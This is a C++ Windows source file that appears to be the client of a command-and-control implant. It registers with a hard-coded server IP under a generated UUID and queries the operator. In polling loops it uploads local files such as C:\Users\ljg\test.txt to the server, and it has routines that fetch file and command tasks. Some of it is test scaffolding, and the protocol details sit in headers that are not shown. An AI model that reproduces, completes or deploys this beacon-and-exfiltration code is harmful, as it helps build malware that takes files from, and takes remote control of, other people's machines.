

#include <windows.h>

#include <vector>

#include "public.h"

#include "http.h"

#include "https.h"

#include "uuid.h"
#include "packet.h"

#include "mission.h"

#include "resource.h"

#include "command.h"
#include <windows.h>
#include <Shlwapi.h>

#include "dialog.h"

#pragma comment(lib,"Shlwapi.lib")
#pragma comment(lib,"ws2_32.lib")

using namespace std;




int init() {
	WSAData wsa;

	int ret = 0;
	ret = WSAStartup(0x0202, &wsa);

	g_ip = inet_addr("192.168.231.1");

	g_httpsToggle = FALSE;

	ret = getUUID();

	return ret;
}



int clear() {
	int ret = 0;
	ret = WSACleanup();

	return ret;
}



int mytestfunc() {
	int ret = 0;
	//ret = uploadHttpsFile("test.txt");
	//ret = uploadFileTest("test.txt");

	char backdata[MAX_SIZE];

	int backsize = MAX_SIZE;

	HttpsProto https(TRUE);

	ret = https.postCmdTest(CMD_ONLINE, backdata,&backsize);

	ret = https.postFileTest("test.txt", backdata, &backsize);

	ret = https.postCmdTest(CMD_QUERY_OPERATOR, backdata, &backsize);

	return ret;
}

int getProc() {
	int ret = 0;

// 	WCHAR url[1024];
// 	WCHAR wstruuid[256];
// 	mbstowcs(wstruuid, g_uuid, sizeof(wstruuid));
// 	WCHAR wstrcmd[256];
// 	mbstowcs(wstrcmd, CMD_ONLINE, sizeof(wstrcmd));
// 	wsprintfW(url, L"/%ws?Data%ws%c%wsData", MY_PHP_SERVER, wstrcmd, (unsigned char)g_uuid_len, wstruuid);

	PacketParcel packet(FALSE);

	HttpsProto * http = (HttpsProto*) packet.getProtocol();

	ret = http->getSubCmd(CMD_GETHOST,GETHOST_ALLH);

	while (TRUE)
	{
		char* data = packet.getbuf();
		int datasize = packet.getbufsize();

		vector<CLIENT_INFO>hosts = parseHosts(data, datasize);

		int num = 0;

		string host = hosts[0].host;

		lstrcpyA(g_uuid, host.c_str());

		//ret = http.getCmd(CMD_QUERY_OPERATOR, backdata, &backsize);

		ret = http->getCmdStr(CMD_SEND_DD_DATA,"c:\\1.txt");
	
	}

	return ret;
}






int postProc() {
	int ret = 0;

	// 	WCHAR url[1024];
	// 	WCHAR wstruuid[256];
	// 	mbstowcs(wstruuid, g_uuid, sizeof(wstruuid));
	// 	WCHAR wstrcmd[256];
	// 	mbstowcs(wstrcmd, CMD_ONLINE, sizeof(wstrcmd));
	// 	wsprintfW(url, L"/%ws?Data%ws%c%wsData", MY_PHP_SERVER, wstrcmd, (unsigned char)g_uuid_len, wstruuid);

	PacketParcel packet(TRUE);

	ret = packet.postAllCmd(CMD_GETHOST, GETHOST_ALLH);

	while (TRUE)
	{
		char* data = packet.getbuf();
		int datasize = packet.getbufsize();
		vector<CLIENT_INFO>hosts = parseHosts(data, datasize);

		int num = 0;

		string host = hosts[0].host;

		lstrcpyA(g_uuid, host.c_str());


		//const char* mydata = "hello,how are you?\r\n fine,thank you,and you?\r\ni am fine too\r\n";

		const char* myfn = "C:\\Users\\ljg\\test.txt";


		ret = packet.postCmdFile(CMD_SEND_DD_DATA, myfn,16);

		Sleep(5000);

		ret = packet.postCmd(CMD_QUERY_OPERATOR,0,0);

	}

	return ret;
}



int mainProc() {
	int ret = 0;
	PacketParcel packet(TRUE);

	ret = packet.postAllCmd(CMD_GETHOST, GETHOST_ALLH);

	while (TRUE)
	{
		char* data = packet.getbuf();
		int datasize = packet.getbufsize();
		vector<CLIENT_INFO>hosts = parseHosts(data, datasize);

		int num = 0;

		string host = hosts[0].host;

		lstrcpyA(g_uuid, host.c_str());

		//const char* mydata = "hello,how are you?\r\n fine,thank you,and you?\r\ni am fine too\r\n";

		const char* myfn = "C:\\Users\\ljg\\test.txt";

		int backsize = MAX_SIZE;
		ret = packet.postCmdFile(CMD_SEND_DD_DATA, myfn,16);

		Sleep(5000);

		ret = packet.postCmd(CMD_QUERY_OPERATOR, 0, 0);

		break;
	}

	return ret;
}


int __stdcall fileMission() {
	int ret = 0;
	DataMission mission;

	mission.getFileMission();

	return ret;
}


int __stdcall cmdMission() {
	int ret = 0;
	DataMission mission;

	mission.getCmdMission();
	return ret;
}



int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {

	int ret = 0;

	ret = init();

	ret = createDialog(hInstance);

	Sleep(-1);

	//ret = fileMission();
	//ret = mainProc();

	ret = clear();

	return 0;
}